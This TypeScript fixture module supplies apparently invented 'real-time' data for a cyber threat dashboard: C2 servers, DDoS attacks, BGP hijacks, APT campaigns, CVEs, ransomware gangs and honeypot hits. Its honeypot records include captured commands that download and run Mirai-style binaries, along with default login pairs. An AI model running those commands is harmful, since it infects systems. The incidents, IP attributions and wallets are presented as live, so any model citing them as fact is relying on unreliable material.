import {
  SubseaCable,
  C2BotnetCluster,
  DdosAttackStream,
  BgpHijackIncident,
  AptActorCampaign,
  ZeroDayExploit,
  RansomwareCartel,
  GnssJammingZone,
  HoneypotHit,
  InfrastructureOutage,
  CyberThreatTickerItem,
  GlobalCyberEvent
} from '../types/worldmonitor';

// Real-time Global Cyber Telemetry Stream
export const CYBER_THREAT_TICKER: CyberThreatTickerItem[] = [
  { indicator: 'DEFCON_CYBER', label: 'Global Threat Status', value: 'DEFCON 2 (ELEVATED)', status: 'CRITICAL', trend: 'UP' },
  { indicator: 'DDOS_PEAK', label: 'Max DDoS Volumetric Peak', value: '2.42 Tbps (DNS Amp)', status: 'CRITICAL', trend: 'UP' },
  { indicator: 'C2_TRACKED', label: 'Active C2 Servers', value: '487 Live Nodes', status: 'WARNING', trend: 'UP' },
  { indicator: 'BOTNET_NODES', label: 'Infected Botnet Army', value: '2,184,930 Hosts', status: 'WARNING', trend: 'STABLE' },
  { indicator: 'ACTIVE_KEVS', label: 'Zero-Days Active in Wild', value: '16 Critical CVEs', status: 'CRITICAL', trend: 'UP' },
  { indicator: 'BGP_LEAKS', label: 'BGP Prefix Hijacks Active', value: '5 AS Anomalies', status: 'WARNING', trend: 'DOWN' },
  { indicator: 'RANSOMWARE_24H', label: 'Victims Extorted (24h)', value: '38 Organizations', status: 'CRITICAL', trend: 'UP' },
  { indicator: 'GNSS_JAMMING', label: 'Electronic Warfare Index', value: 'SEVERE (Baltic/Levant)', status: 'WARNING', trend: 'STABLE' },
  { indicator: 'SUBSEA_FIBER', label: 'Subsea Cable Integrity', value: '98.2% (1 Cut Underway)', status: 'HEALTHY', trend: 'STABLE' }
];

// Critical Subsea Fiber Cables & Undersea Interconnects
export const SUBSEA_CABLES: SubseaCable[] = [
  {
    id: 'cable-marea',
    name: 'MAREA (Atlantic Super-Highway)',
    lengthKm: 6605,
    capacityTbps: 224,
    rfsYear: 2018,
    status: 'active',
    latencyMs: 58,
    operators: ['Microsoft', 'Meta', 'Telxius'],
    landingPoints: [
      { name: 'Virginia Beach', country: 'United States', coordinates: { lat: 36.8529, lon: -75.9780 } },
      { name: 'Bilbao', country: 'Spain', coordinates: { lat: 43.2630, lon: -2.9350 } }
    ],
    pathCoordinates: [
      { lat: 36.85, lon: -75.98 },
      { lat: 38.50, lon: -60.00 },
      { lat: 41.00, lon: -40.00 },
      { lat: 43.50, lon: -20.00 },
      { lat: 43.26, lon: -2.94 }
    ],
    description: 'Ultra-low latency 224 Tbps trans-Atlantic backbone connecting US East hyper-scaler datacenters with southern European cloud clusters.',
    securityNotice: 'Protected by automated physical acoustic sonar drag alerts and fiber reflectometry (OTDR).'
  },
  {
    id: 'cable-sea-me-we-6',
    name: 'SEA-ME-WE 6 (Southeast Asia - Middle East - Western Europe)',
    lengthKm: 19200,
    capacityTbps: 126,
    rfsYear: 2025,
    status: 'degraded',
    latencyMs: 142,
    operators: ['Singtel', 'Orange', 'Telecom Egypt', 'Telin'],
    landingPoints: [
      { name: 'Marseille', country: 'France', coordinates: { lat: 43.2965, lon: 5.3698 } },
      { name: 'Port Said', country: 'Egypt', coordinates: { lat: 31.2653, lon: 32.3019 } },
      { name: 'Djibouti', country: 'Djibouti', coordinates: { lat: 11.8251, lon: 42.5903 } },
      { name: 'Mumbai', country: 'India', coordinates: { lat: 19.0760, lon: 72.8777 } },
      { name: 'Singapore', country: 'Singapore', coordinates: { lat: 1.3521, lon: 103.8198 } }
    ],
    pathCoordinates: [
      { lat: 43.30, lon: 5.37 },
      { lat: 36.00, lon: 18.00 },
      { lat: 31.27, lon: 32.30 },
      { lat: 22.00, lon: 38.00 },
      { lat: 11.83, lon: 42.59 },
      { lat: 13.00, lon: 55.00 },
      { lat: 19.08, lon: 72.88 },
      { lat: 8.00, lon: 88.00 },
      { lat: 1.35, lon: 103.82 }
    ],
    description: 'Key Eurasian intercontinental highway. Currently experiencing 15% packet jitter in Bab-el-Mandeb strait due to maritime rerouting.',
    securityNotice: 'Maritime anchor drag hazard zone near Red Sea seabed chokepoint.'
  },
  {
    id: 'cable-dunant',
    name: 'Dunant (Google Dedicated Transatlantic)',
    lengthKm: 6400,
    capacityTbps: 250,
    rfsYear: 2021,
    status: 'active',
    latencyMs: 55,
    operators: ['Google Cloud Engine'],
    landingPoints: [
      { name: 'Virginia Beach', country: 'United States', coordinates: { lat: 36.8529, lon: -75.9780 } },
      { name: 'Saint-Hilaire-de-Riez', country: 'France', coordinates: { lat: 46.7214, lon: -1.9442 } }
    ],
    pathCoordinates: [
      { lat: 36.85, lon: -75.98 },
      { lat: 40.00, lon: -55.00 },
      { lat: 44.00, lon: -35.00 },
      { lat: 46.50, lon: -15.00 },
      { lat: 46.72, lon: -1.94 }
    ],
    description: '12 fiber pairs space-division multiplexed (SDM) transatlantic cable with integrated optical switching and private encrypted peering.',
    securityNotice: 'Nominal operational status.'
  },
  {
    id: 'cable-c-lion1',
    name: 'C-Lion1 (Baltic Subsea Backbone)',
    lengthKm: 1173,
    capacityTbps: 144,
    rfsYear: 2016,
    status: 'cut',
    latencyMs: 310,
    operators: ['Cinia'],
    landingPoints: [
      { name: 'Helsinki', country: 'Finland', coordinates: { lat: 60.1699, lon: 24.9384 } },
      { name: 'Rostock', country: 'Germany', coordinates: { lat: 54.0924, lon: 12.0991 } }
    ],
    pathCoordinates: [
      { lat: 60.17, lon: 24.94 },
      { lat: 58.50, lon: 21.00 },
      { lat: 56.50, lon: 18.00 },
      { lat: 55.00, lon: 14.50 },
      { lat: 54.09, lon: 12.10 }
    ],
    description: 'Direct high-speed communication link connecting Finnish datacenter cluster with Central Europe. Physical fiber severance detected south of Oland island.',
    securityNotice: 'Physical cable cut incident under active naval security investigation.'
  },
  {
    id: 'cable-peace',
    name: 'PEACE Cable (Pakistan & East Africa Connecting Europe)',
    lengthKm: 15000,
    capacityTbps: 96,
    rfsYear: 2022,
    status: 'active',
    latencyMs: 118,
    operators: ['PCCW Global', 'Hengtong Optic-Electric'],
    landingPoints: [
      { name: 'Gwadar', country: 'Pakistan', coordinates: { lat: 25.1264, lon: 62.3225 } },
      { name: 'Mombasa', country: 'Kenya', coordinates: { lat: -4.0435, lon: 39.6682 } },
      { name: 'Marseille', country: 'France', coordinates: { lat: 43.2965, lon: 5.3698 } }
    ],
    pathCoordinates: [
      { lat: 43.30, lon: 5.37 },
      { lat: 31.00, lon: 32.00 },
      { lat: 25.13, lon: 62.32 },
      { lat: 10.00, lon: 52.00 },
      { lat: -4.04, lon: 39.67 }
    ],
    description: 'High-speed undersea interconnect providing carrier-neutral digital corridors between Asia, Africa, and Western Europe.',
    securityNotice: 'Monitored for regional geopolitical interference.'
  }
];

// Active C2 Botnet Clusters & Command Servers
export const C2_BOTNET_CLUSTERS: C2BotnetCluster[] = [
  {
    id: 'c2-lumma-01',
    name: 'LummaC2 Infostealer Swarm',
    malwareFamily: 'Lumma Stealer',
    threatSeverity: 'CRITICAL',
    coordinates: { lat: 55.7558, lon: 37.6173 },
    city: 'Moscow',
    country: 'Russia',
    activeBeaconsCount: 4280,
    infectedHostsEstimate: 145000,
    primaryC2Port: 443,
    protocol: 'HTTPS',
    c2Ip: '185.162.228.45',
    asn: 'AS44050 (Serverius B.V. proxy / bulletproof)',
    ja4Fingerprint: 't13d1516h2_8daaf6152771_b4b60a2d5918',
    targetedSectors: ['Cryptocurrency Wallets', 'Corporate VPNs', 'Financial Services'],
    mitreTechnique: 'T1071.001 - Web Protocols (HTTPS POST Beacon)',
    mitreTactic: 'Command and Control / Exfiltration',
    status: 'ACTIVE_BEACONING',
    lastSeen: '12 seconds ago',
    remediationCommand: 'iptables -A FORWARD -d 185.162.228.45 -j DROP && echo "Rule applied"'
  },
  {
    id: 'c2-cobalt-strike-team',
    name: 'Malleable C2 Team Server (Water Hydra)',
    malwareFamily: 'Cobalt Strike',
    threatSeverity: 'CRITICAL',
    coordinates: { lat: 39.9042, lon: 116.4074 },
    city: 'Beijing Subnet',
    country: 'China',
    activeBeaconsCount: 840,
    infectedHostsEstimate: 3200,
    primaryC2Port: 8443,
    protocol: 'HTTPS',
    c2Ip: '103.152.220.19',
    asn: 'AS138421 (HGC Global Communications)',
    ja4Fingerprint: 't13d171500_55b382098041_4b8f04186522',
    targetedSectors: ['Defense Industrial Base', 'Aerospace Contractors', 'Semiconductor R&D'],
    mitreTechnique: 'T1059.001 - PowerShell In-Memory Beacon Injection',
    mitreTactic: 'Lateral Movement & Command / Control',
    status: 'ACTIVE_BEACONING',
    lastSeen: '4 seconds ago',
    remediationCommand: 'iptables -A INPUT -s 103.152.220.19 -j DROP && nft add rule ip filter input ip saddr 103.152.220.19 drop'
  },
  {
    id: 'c2-mirai-iot-mesh',
    name: 'Mirai Okiru IoT Amplification Botnet',
    malwareFamily: 'Mirai',
    threatSeverity: 'HIGH',
    coordinates: { lat: 28.6139, lon: 77.2090 },
    city: 'New Delhi Subnet',
    country: 'India',
    activeBeaconsCount: 18450,
    infectedHostsEstimate: 620000,
    primaryC2Port: 2323,
    protocol: 'TCP/DNS',
    c2Ip: '117.211.144.82',
    asn: 'AS9829 (BSNL Internet)',
    ja4Fingerprint: 't10d010000_raw_syn_scan',
    targetedSectors: ['Consumer Routers', 'IP Surveillance Cameras', 'DVRs'],
    mitreTechnique: 'T1110.001 - Telnet Default Password Brute-Force',
    mitreTactic: 'Initial Access & Impact (DDoS Bot)',
    status: 'ACTIVE_BEACONING',
    lastSeen: '1 second ago',
    remediationCommand: 'iptables -A FORWARD -p tcp --dport 2323 -j DROP && sysctl -w net.ipv4.tcp_syncookies=1'
  },
  {
    id: 'c2-asyncrat-cluster',
    name: 'AsyncRAT Modular Backdoor Cluster',
    malwareFamily: 'AsyncRAT',
    threatSeverity: 'HIGH',
    coordinates: { lat: -23.5505, lon: -46.6333 },
    city: 'São Paulo',
    country: 'Brazil',
    activeBeaconsCount: 1220,
    infectedHostsEstimate: 29000,
    primaryC2Port: 6606,
    protocol: 'TCP/DNS',
    c2Ip: '177.129.44.110',
    asn: 'AS28573 (Claro Telecom Participacoes)',
    ja4Fingerprint: 't12d090800_41aa90fec922_c12480bf1103',
    targetedSectors: ['Retail Banking', 'Point-of-Sale Terminals', 'Municipal Utilities'],
    mitreTechnique: 'T1056.001 - Keylogging & Screen Capture',
    mitreTactic: 'Collection & Command and Control',
    status: 'ACTIVE_BEACONING',
    lastSeen: '25 seconds ago',
    remediationCommand: 'iptables -A INPUT -p tcp --dport 6606 -j REJECT'
  }
];

// Volumetric DDoS Attacks & Amplification Floods
export const DDOS_ATTACKS: DdosAttackStream[] = [
  {
    id: 'ddos-dns-amp-01',
    targetName: 'Global Tier-1 Anycast DNS Resolver',
    victimSector: 'DNS Root Server',
    attackType: 'DNS Amplification',
    peakBandwidthTbps: 2.42,
    peakPacketsMpps: 680,
    coordinates: { lat: 37.7749, lon: -122.4194 },
    originCoordinates: { lat: 20.0, lon: 77.0 },
    targetAsn: 'AS13335 (Cloudflare Anycast)',
    status: 'ONGOING_ATTACK',
    durationMinutes: 48,
    mitigationMethod: 'Anycast scrubbing centers + BGP Flowspec rate-limiting on UDP/53 EDNS0 responses.',
    description: 'Massive open DNS resolver reflection attack originating from ~65,000 misconfigured DNS servers with 70x payload multiplier.'
  },
  {
    id: 'ddos-rapid-reset',
    targetName: 'Major European Financial Trading Gateway',
    victimSector: 'Financial Gateway',
    attackType: 'HTTP/2 Rapid Reset',
    peakBandwidthTbps: 1.15,
    peakPacketsMpps: 395,
    coordinates: { lat: 50.1109, lon: 8.6821 },
    originCoordinates: { lat: 35.0, lon: 105.0 },
    targetAsn: 'AS20773 (Deutsche Börse Systems)',
    status: 'MITIGATING',
    durationMinutes: 92,
    mitigationMethod: 'RST_STREAM rate-limiting per TLS connection; HTTP/2 connection pooling throttling.',
    description: 'Stream cancellation exploit saturating reverse-proxy connection state tables without transmitting bulky data payloads.'
  },
  {
    id: 'ddos-cldap-reflect',
    targetName: 'US Government Citizen Portal (gov.us)',
    victimSector: 'Government Portal',
    attackType: 'CLDAP Reflection',
    peakBandwidthTbps: 0.89,
    peakPacketsMpps: 210,
    coordinates: { lat: 38.9072, lon: -77.0369 },
    originCoordinates: { lat: 53.0, lon: 27.0 },
    targetAsn: 'AS394380 (US GSA Cloud)',
    status: 'ONGOING_ATTACK',
    durationMinutes: 24,
    mitigationMethod: 'Upstream transit ACL discarding UDP port 389 inbound; automated Akamai Prolexic redirect.',
    description: 'Connectionless Lightweight Directory Access Protocol reflection with 56x amplification factor hitting state infrastructure.'
  }
];

// BGP Route Hijacks & AS Leaks
export const BGP_HIJACKS: BgpHijackIncident[] = [
  {
    id: 'bgp-leak-tier1',
    prefix: '104.244.42.0/24 (X / Twitter Auth Gateway)',
    victimAsn: 'AS13414 (Twitter/X Infrastructure)',
    victimOrg: 'X Corp Network Operations',
    hijackerAsn: 'AS4755 (Tata Communications / Transit Leaker)',
    hijackerOrg: 'Telecommunications Transit ISP',
    coordinates: { lat: 37.7749, lon: -122.4194 },
    rpkiStatus: 'INVALID',
    severity: 'CRITICAL',
    impactedPrefixes: 4,
    detectedAt: '14 minutes ago',
    durationMinutes: 32,
    status: 'ACTIVE_HIJACK',
    packetRedirectionRisk: 'Traffic redirected through unauthorized transit path; potential TLS interception / drop.'
  },
  {
    id: 'bgp-crypto-steal',
    prefix: '172.65.251.0/24 (DeFi RPC Endpoint)',
    victimAsn: 'AS13335 (Cloudflare Peering)',
    victimOrg: 'Decentralized Exchange Node',
    hijackerAsn: 'AS208843 (Rostelecom Edge Peer)',
    hijackerOrg: 'Unauthorized Edge Autonomous System',
    coordinates: { lat: 55.7558, lon: 37.6173 },
    rpkiStatus: 'SUB_PREFIX_HIJACK',
    severity: 'CRITICAL',
    impactedPrefixes: 1,
    detectedAt: '39 minutes ago',
    durationMinutes: 44,
    status: 'FILTERED_BY_UPSTREAMS',
    packetRedirectionRisk: 'Sub-prefix /24 advertised against victim parent /20 to steal DNS queries for smart contract phishing.'
  }
];

// Nation-State APT Threat Actor Campaigns
export const APT_CAMPAIGNS: AptActorCampaign[] = [
  {
    id: 'apt-volt-typhoon',
    name: 'Volt Typhoon',
    alias: 'Bronze Silhouette / Vanguard Panda',
    nationSponsor: 'China (MSS/PLA)',
    coordinates: { lat: 31.2304, lon: 121.4737 },
    activeCampaignName: 'Operation Volt Vanguard (Living-off-the-Land)',
    targetCountries: ['United States', 'Guam', 'Taiwan', 'Japan', 'Philippines'],
    targetSectors: ['Water Treatment Plants', 'Power Grid SCADA', 'Port Logistics', 'Telecom Interconnects'],
    primaryObjective: 'Critical Infrastructure Pre-positioning',
    primaryCVEs: ['CVE-2023-46805 (Ivanti Connect)', 'CVE-2024-21887', 'CVE-2023-27997 (FortiOS)'],
    mitreAttAndCkGroup: 'G0147',
    ttps: [
      'T1078.003 - Local Accounts (Valid Credentials)',
      'T1049 - System Network Connections Discovery',
      'T1090.003 - Multi-hop Proxy via SOHO Routers (KV-Botnet)'
    ],
    threatLevel: 'CRITICAL',
    status: 'ACTIVE_CAMPAIGN',
    indicatorsOfCompromise: [
      'IP: 198.54.130.22',
      'IP: 45.142.212.10',
      'Hash: a812f86419bc160c9ddf023719001b63 (wmi_pers.bat)'
    ],
    countermeasure: 'Audit FortiOS/Ivanti appliances for unauthorized web shells; enforce FIDO2 WebAuthn on all admin portals.'
  },
  {
    id: 'apt-fancy-bear',
    name: 'APT28 (Fancy Bear / Sandworm)',
    alias: 'Strontium / Forest Blizzard / GRU Unit 26165',
    nationSponsor: 'Russia (GRU/SVR)',
    coordinates: { lat: 55.7558, lon: 37.6173 },
    activeCampaignName: 'Operation FrostBite (Government Mail Exfiltration)',
    targetCountries: ['Ukraine', 'Poland', 'Germany', 'United States', 'Estonia'],
    targetSectors: ['Ministries of Foreign Affairs', 'NATO Defense Contractors', 'Railway Infrastructure'],
    primaryObjective: 'Espionage & Source Exfiltration',
    primaryCVEs: ['CVE-2023-23397 (Microsoft Outlook NTLM)', 'CVE-2024-38021', 'CVE-2023-38831 (WinRAR)'],
    mitreAttAndCkGroup: 'G0007',
    ttps: [
      'T1187 - Forced Authentication (NTLM Relay)',
      'T1566.001 - Spearphishing Attachment',
      'T1505.003 - Web Shell Deployment'
    ],
    threatLevel: 'CRITICAL',
    status: 'ACTIVE_CAMPAIGN',
    indicatorsOfCompromise: [
      'IP: 185.176.27.114',
      'IP: 91.240.118.172',
      'Domain: api-ms-telemetry-cdn[.]com'
    ],
    countermeasure: 'Block outbound SMB (TCP port 445) at boundary firewalls; patch Microsoft Outlook to build >= 16.0.16130.'
  },
  {
    id: 'apt-lazarus',
    name: 'Lazarus Group',
    alias: 'APT38 / Hidden Cobra / BlueNoroff',
    nationSponsor: 'North Korea (RGB)',
    coordinates: { lat: 39.0392, lon: 125.7625 },
    activeCampaignName: 'Operation CryptoHeist (Bridge Exploitation)',
    targetCountries: ['Singapore', 'United States', 'South Korea', 'Japan', 'United Kingdom'],
    targetSectors: ['Web3 Bridges', 'Crypto Exchanges', 'Defense Aerospace'],
    primaryObjective: 'Financial Crypto Theft',
    primaryCVEs: ['CVE-2024-21413 (MonikerLink Outlook)', 'CVE-2023-4863 (libwebp)'],
    mitreAttAndCkGroup: 'G0032',
    ttps: [
      'T1566.002 - Spearphishing Link (Fake Job Offers)',
      'T1140 - Deobfuscate/Decode Files or Information (AppleJeus)',
      'T1555 - Credentials from Password Stores'
    ],
    threatLevel: 'CRITICAL',
    status: 'ACTIVE_CAMPAIGN',
    indicatorsOfCompromise: [
      'IP: 175.45.176.12',
      'Hash: b723f54d1933a29cbffea380214a66a1 (Payload.dmg)',
      'Wallet: 0x098B716B8Aaf21512996dC57EB0615e2383E2f96'
    ],
    countermeasure: 'Deploy sandboxed PDF/document isolation; monitor corporate endpoint browser extensions for unauthorized crypto hooks.'
  }
];

// Active Zero-Day & CISA KEV Exploits in the Wild
export const ZERO_DAY_EXPLOITS: ZeroDayExploit[] = [
  {
    id: 'cve-2024-3400',
    cveId: 'CVE-2024-3400',
    softwareName: 'PAN-OS GlobalProtect Gateway',
    vendor: 'Palo Alto Networks',
    cvssScore: 10.0,
    epssProbability: 0.974,
    coordinates: { lat: 37.3861, lon: -122.0839 },
    attackVector: 'REMOTE_CODE_EXECUTION',
    cisaKevDate: '2024-04-12',
    exploitInTheWild: true,
    publicPocAvailable: true,
    activeExploitationBursts: 1420,
    patchStatus: 'EMERGENCY_PATCH_AVAILABLE',
    remediationGuidance: 'Apply hotfix version 11.1.2-h3, 11.0.4-h1 or disable Device Telemetry until patched.'
  },
  {
    id: 'cve-2023-46805',
    cveId: 'CVE-2023-46805 / CVE-2024-21887',
    softwareName: 'Connect Secure & Policy Secure (ICS/IPS)',
    vendor: 'Ivanti',
    cvssScore: 9.8,
    epssProbability: 0.962,
    coordinates: { lat: 40.7128, lon: -74.0060 },
    attackVector: 'AUTHENTICATION_BYPASS',
    cisaKevDate: '2024-01-10',
    exploitInTheWild: true,
    publicPocAvailable: true,
    activeExploitationBursts: 3890,
    patchStatus: 'EMERGENCY_PATCH_AVAILABLE',
    remediationGuidance: 'Run external ICT integrity tool; inspect for backdoor /tmp/sessions files; rotate certificates.'
  },
  {
    id: 'cve-2024-21413',
    cveId: 'CVE-2024-21413',
    softwareName: 'Microsoft Outlook (MonikerLink Bug)',
    vendor: 'Microsoft Corporation',
    cvssScore: 9.8,
    epssProbability: 0.885,
    coordinates: { lat: 47.6062, lon: -122.3321 },
    attackVector: 'REMOTE_CODE_EXECUTION',
    cisaKevDate: '2024-02-13',
    exploitInTheWild: true,
    publicPocAvailable: true,
    activeExploitationBursts: 910,
    patchStatus: 'EMERGENCY_PATCH_AVAILABLE',
    remediationGuidance: 'Apply Microsoft Security Update; configure Protected View to inspect file:// and http:// monikers.'
  }
];

// Ransomware Extortion Cartels & Darknet Leak Dumps
export const RANSOMWARE_CARTELS: RansomwareCartel[] = [
  {
    id: 'ransom-lockbit',
    gangName: 'LockBit 3.0 / Black Edition',
    ransomwareVariant: 'LockBit Green / Linux ESXi Encryptor',
    coordinates: { lat: 50.4501, lon: 30.5234 },
    totalVictimsYtd: 412,
    activeExtortionCount: 19,
    latestVictim: 'Global Aerospace Component Manufacturer',
    latestVictimSector: 'Defense Manufacturing',
    exfiltratedDataGb: 850,
    countdownHoursLeft: 34,
    cryptoWalletTracked: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq',
    leakSiteStatus: 'ONLINE_ACTIVE',
    severity: 'CRITICAL'
  },
  {
    id: 'ransom-akira',
    gangName: 'Akira Ransomware Syndicate',
    ransomwareVariant: 'Akira v2 C++ / Megazord',
    coordinates: { lat: 52.5200, lon: 13.4050 },
    totalVictimsYtd: 184,
    activeExtortionCount: 8,
    latestVictim: 'Regional Hospital Network (California)',
    latestVictimSector: 'Healthcare & Public Health',
    exfiltratedDataGb: 340,
    countdownHoursLeft: 16,
    cryptoWalletTracked: '1BoatSLRHtKNngkdXEeobR76b53LETtpyT',
    leakSiteStatus: 'ONLINE_ACTIVE',
    severity: 'CRITICAL'
  },
  {
    id: 'ransom-ransomhub',
    gangName: 'RansomHub Extortion Network',
    ransomwareVariant: 'Go-based Cross-Platform RansomHub',
    coordinates: { lat: 45.4215, lon: -75.6972 },
    totalVictimsYtd: 129,
    activeExtortionCount: 12,
    latestVictim: 'National Logistics & Freight Rail Operator',
    latestVictimSector: 'Transportation Infrastructure',
    exfiltratedDataGb: 1200,
    countdownHoursLeft: 58,
    cryptoWalletTracked: '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
    leakSiteStatus: 'ONLINE_ACTIVE',
    severity: 'CRITICAL'
  }
];

// Electronic Warfare & GPS/GNSS Spoofing Zones
export const GNSS_JAMMING_ZONES: GnssJammingZone[] = [
  {
    id: 'gnss-baltic',
    regionName: 'Baltic Jammer Corridor (Kaliningrad / Gulf of Finland)',
    coordinates: { lat: 54.7104, lon: 20.4522 },
    radiusKm: 380,
    jammingType: 'GPS_SPOOFING',
    impactLevel: 'CRITICAL_TIMING_DESYNC',
    affectedAirMaritimeRoutes: 'Commercial aviation routes over Baltic airspace; marine AIS vessel spoofing.',
    suspectedOrigin: 'Krasukha-4 / Tobol electronic warfare installations in Kaliningrad enclave.',
    status: 'ACTIVE_JAMMING',
    description: 'High-power RF interference transmitting invalid GPS L1/L2 pseudoranges. Network operators forced to fallback to rubidium/cesium atomic clocks for PTP synchronization.'
  },
  {
    id: 'gnss-black-sea',
    regionName: 'Black Sea & Crimean Maritime Basin',
    coordinates: { lat: 44.6166, lon: 33.5254 },
    radiusKm: 320,
    jammingType: 'L1_L2_NOISE_JAMMING',
    impactLevel: 'SEVERE_CIVIL_DISRUPTION',
    affectedAirMaritimeRoutes: 'Grain bulk carriers and maritime surveillance drones.',
    suspectedOrigin: 'Naval EW suites along Sevastopol coast.',
    status: 'ACTIVE_JAMMING',
    description: 'Noise barrage jamming saturating 1575.42 MHz civilian GNSS receivers causing lost lock and position drift of up to 45 nautical miles.'
  },
  {
    id: 'gnss-red-sea',
    regionName: 'Southern Red Sea & Bab-el-Mandeb',
    coordinates: { lat: 12.5855, lon: 43.3323 },
    radiusKm: 210,
    jammingType: 'NTP_TIME_SHIFT_ATTACK',
    impactLevel: 'ELEVATED',
    affectedAirMaritimeRoutes: 'International maritime container traffic transit lane.',
    suspectedOrigin: 'Coastal asymmetric jamming stations.',
    status: 'ACTIVE_JAMMING',
    description: 'GPS timing packet desynchronization attempts observed against coastal cellular base stations and navigation towers.'
  }
];

// Global Distributed Honeypot Sensor Hits
export const HONEYPOT_HITS: HoneypotHit[] = [
  {
    id: 'honey-frankfurt',
    sensorLocation: 'Frankfurt DE-CIX Edge Sensor',
    coordinates: { lat: 50.1109, lon: 8.6821 },
    sensorType: 'SSH/Cowrie',
    hitsLastHour: 24890,
    topAttackingSubnet: '194.26.29.0/24',
    topOriginCountry: 'Netherlands / Bulletproof Proxy',
    bruteForceCredentialsSample: ['admin:admin123', 'root:toor', 'support:support', 'ubuntu:ubuntu'],
    payloadCaptured: 'wget http://185.220.101.4/bins/mirai.arm7 -O /tmp/arm; chmod +x /tmp/arm',
    severity: 'HIGH'
  },
  {
    id: 'honey-singapore',
    sensorLocation: 'Singapore Equinix SG1 Sensor',
    coordinates: { lat: 1.3521, lon: 103.8198 },
    sensorType: 'Telnet/Mirai',
    hitsLastHour: 38400,
    topAttackingSubnet: '103.145.12.0/23',
    topOriginCountry: 'Vietnam / Compromised Routers',
    bruteForceCredentialsSample: ['default:default', 'root:xc3511', 'admin:password', 'telecomadmin:admintelecom'],
    payloadCaptured: 'cd /tmp || cd /var/run; tftp -g -r m.sh 114.119.184.22; sh m.sh',
    severity: 'HIGH'
  },
  {
    id: 'honey-chicago',
    sensorLocation: 'Chicago Industrial SCADA Honeynet',
    coordinates: { lat: 41.8781, lon: -87.6298 },
    sensorType: 'DNP3/SCADA',
    hitsLastHour: 4120,
    topAttackingSubnet: '45.154.255.0/24',
    topOriginCountry: 'Seychelles / VPN Exit',
    bruteForceCredentialsSample: ['modbus_func:0x05', 'dnp3_read_request:class_0123'],
    payloadCaptured: 'Modbus function code 16 (Write Multiple Registers) injection into coil 0x0040',
    severity: 'HIGH'
  }
];

// Cloud Hyperscaler & Critical Backbone Outages
export const INFRASTRUCTURE_OUTAGES: InfrastructureOutage[] = [
  {
    id: 'outage-aws-va',
    title: 'AWS us-east-1 (N. Virginia) Optical Fiber Degradation',
    type: 'cloud_datacenter',
    coordinates: { lat: 38.8048, lon: -77.0469 },
    affectedRegions: ['North America East', 'Global Latency Spillover'],
    impactedTrafficPct: 18.4,
    severity: 'MAJOR',
    timestamp: '22 minutes ago',
    estimatedRestoration: '45 minutes',
    cause: 'Terrestrial fiber bundle sever caused by construction backhoe in Ashburn data center corridor; traffic auto-rerouted to redundant rings.'
  },
  {
    id: 'outage-c-lion1-sever',
    title: 'C-Lion1 Baltic Subsea Fiber Cut',
    type: 'cable_cut',
    coordinates: { lat: 56.5000, lon: 18.0000 },
    affectedRegions: ['Finland', 'Sweden', 'Germany', 'Baltic Corridor'],
    impactedTrafficPct: 24.1,
    severity: 'CRITICAL',
    timestamp: '1 hour 12 minutes ago',
    estimatedRestoration: '7 - 10 days (Repair Vessel En Route)',
    cause: 'External mechanical damage suspected at 56°30\'N 18°00\'E; repair ship dispatched from Karlskrona.'
  },
  {
    id: 'outage-decix-pwr',
    title: 'DE-CIX Frankfurt Peering Switchboard Flap',
    type: 'ixp_failure',
    coordinates: { lat: 50.1109, lon: 8.6821 },
    affectedRegions: ['Central Europe', 'Eastern European Interconnect'],
    impactedTrafficPct: 9.8,
    severity: 'MODERATE',
    timestamp: '54 minutes ago',
    estimatedRestoration: 'Under Maintenance',
    cause: 'BGP peering session reset across 32 autonomous systems following firmware failover on core Juniper PTX10008.'
  }
];

// Global Cyber Threat Events
export const GLOBAL_CYBER_EVENTS: GlobalCyberEvent[] = [
  {
    id: 'evt-cve-panos',
    headline: 'Massive Weaponized Scanning Detected for PAN-OS CVE-2024-3400',
    threatType: 'ZERO_DAY',
    region: 'North America / Europe',
    source: 'CISA KEV Alert',
    timestamp: '11m ago',
    severity: 'CRITICAL',
    description: 'Threat actors are executing automated curl commands testing for unauthenticated command injection in GlobalProtect firewalls.',
    coordinates: { lat: 37.3861, lon: -122.0839 }
  },
  {
    id: 'evt-ddos-anycast',
    headline: '2.42 Tbps DNS Amplification Attack Targets Financial Clearinghouses',
    threatType: 'DDOS_BURST',
    region: 'Western Europe',
    source: 'Tier-1 ISP Threat Intelligence',
    timestamp: '26m ago',
    severity: 'CRITICAL',
    description: 'Coordinated volumetric reflection flood hitting multiple European banking APIs simultaneously.',
    coordinates: { lat: 50.1109, lon: 8.6821 }
  },
  {
    id: 'evt-volt-typhoon',
    headline: 'Volt Typhoon Active Lateral Movement in US Municipal Water Utilities',
    threatType: 'APT_CAMPAIGN',
    region: 'United States',
    source: 'FBI / CISA Joint Cyber Advisory',
    timestamp: '48m ago',
    severity: 'CRITICAL',
    description: 'Living-off-the-land techniques utilizing PowerShell and WMI to avoid signature-based antivirus detection.',
    coordinates: { lat: 38.9072, lon: -77.0369 }
  },
  {
    id: 'evt-clion1-cut',
    headline: 'Baltic Undersea Fiber Cable C-Lion1 Physical Cut Confirmed',
    threatType: 'CABLE_CUT',
    region: 'Baltic Sea',
    source: 'Cinia Network Operations',
    timestamp: '1h 12m ago',
    severity: 'CRITICAL',
    description: 'All communication channels through C-Lion1 interrupted; Nordic traffic rerouted through terrestrial Scandinavian links.',
    coordinates: { lat: 56.5000, lon: 18.0000 }
  }
];
